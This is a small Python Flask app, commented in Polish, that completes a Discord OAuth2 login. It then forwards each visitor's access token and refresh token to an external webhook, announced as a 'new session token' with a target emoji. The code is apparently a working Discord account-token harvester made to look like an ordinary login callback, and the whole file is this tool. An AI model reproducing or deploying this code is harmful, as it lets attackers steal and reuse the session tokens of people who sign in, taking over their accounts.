from flask import Flask, request, jsonify, render_template
import requests
import os
import json

app = Flask(__name__)

CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "❌ No code provided.", 400

    # Wymiana kodu na token
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    response = requests.post("https://discord.com/api/v9/oauth2/token", data=data, headers=headers)
    
    if response.status_code != 200:
        return f"❌ Error: {response.text}", 400

    token_data = response.json()
    access_token = token_data.get("access_token")
    refresh_token = token_data.get("refresh_token")
    expires_in = token_data.get("expires_in")

    # Wysłanie na webhook
    if WEBHOOK_URL:
        webhook_data = {
            "content": f"**🎯 Nowy token sesyjny!**\n```{access_token}```\n**Refresh token:** `{refresh_token}`\n**Ważny przez:** {expires_in}s"
        }
        requests.post(WEBHOOK_URL, json=webhook_data)

    return render_template('index.html', success=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
